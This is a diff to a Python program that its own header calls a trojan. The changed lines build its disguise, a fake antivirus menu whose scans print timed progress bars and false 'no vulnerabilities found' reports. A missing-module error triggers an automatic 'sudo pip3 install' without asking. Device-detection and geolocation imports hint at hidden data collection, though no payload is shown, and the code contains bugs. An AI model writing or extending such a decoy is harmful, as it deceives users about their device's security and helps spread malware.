@@ -1,6 +1,6 @@
 """
 Author: @new92
-Trojan program
+Trojan Program
 Made for educational purposes 
 The author has no responsibility for any illegal activity/activities carried out using this program
           d8888                   888      d8b
@@ -49,12 +49,14 @@ try:
     from device_detector import SoftwareDetector
     from geopy.geocoders import Nominatim
 except ImportError as imp:
-    print("Error while importing modules !")
+    print("[!] WARNING: Not all modules used in this program have been installed !")
     time.sleep(2)
-    print("Ignoring Error...")
-    time.sleep(2)
-    system("sudo pip3 install -r requirements.txt")
-    pass
+    print("[+] Ignoring Warning...")
+    time.sleep(1)
+    if platform.system == "Windows":
+        system("pip3 install -r requirements.txt")
+    else:
+        system("sudo pip3 install -r requirements.txt")
 #End of Imports
 
 #Main program
@@ -121,13 +123,13 @@ print("[4] : Scan for vulnerabilities")
 time.sleep(1)
 print("[5] : Database Update")
 time.sleep(1)
-action=int(input("Please enter the action you want to make: "))
+action=int(input("[+] Please enter the action you want to make: "))
 while action < 1 or action > 5:
-    print("Invalid Action !")
+    print("[!] Invalid Action !")
     time.sleep(2)
-    action=int(input("Please enter again: "))
+    action=int(input("[+] Please enter again: "))
 if action == 1:
-    print("Initiating Quick System Scan...")
+    print("[+] Initiating Quick System Scan...")
     time.sleep(2)
     print("[----------] 0%")
     time.sleep(4)
@@ -141,13 +143,13 @@ if action == 1:
     time.sleep(4)
     print("[==========] 100%")
     time.sleep(2)
-    print("Scan successful ! Everything seems to be perfect :)")
+    print("[+] Scan successful ! Everything seems to be perfect :)")
 elif action == 2:
-    print("Initiating Full System Scan...")
+    print("[+] Initiating Full System Scan...")
     time.slep(2)
-    print("This process may last long time")
+    print("[+] This process may last long time")
     time.sleep(1)
-    print("Please do not shutdown your computer")
+    print("[+] Please do not shutdown your device")
     time.sleep(3)
     print("[----------] 0%")
     time.sleep(20)
@@ -171,13 +173,13 @@ elif action == 2:
     time.sleep(20)
     print("[==========] 100%")
     time.sleep(2)
-    print("Scan successful ! Everything seems to be perfect :)")
+    print("[!] Scan successful ! Everything seems to be perfect :)")
 elif action == 3:
-    print("Good ! 0 Files have been putted in quarantine !")
+    print("[+] Good ! 0 Files have been putted in quarantine !")
 elif action == 4:
-    print("Initiating Scan for Vulnerabilities...")
+    print("[+] Initiating Scan for Vulnerabilities...")
     time.sleep(2)
-    print("Please do not shutdown your device !")
+    print("[+] Please do not shutdown your device !")
     time.sleep(2)
     print("[----------] 0%")
     time.sleep(4)
@@ -191,9 +193,9 @@ elif action == 4:
     time.sleep(5)
     print("[==========] 100%")
     time.sleep(2)
-    print("Scan successful ! No vulnerabilities found :)")
+    print("[!] Scan successful ! No vulnerabilities found :)")
 elif action == 5:
-    print("No database update needed")
+    print("[+] No database update needed")
     time.sleep(2)
-    print("The program updated them "+str(num)+" hours ago")
+    print("[+] The program updated them "+str(num)+" hours ago")
 #End of the program
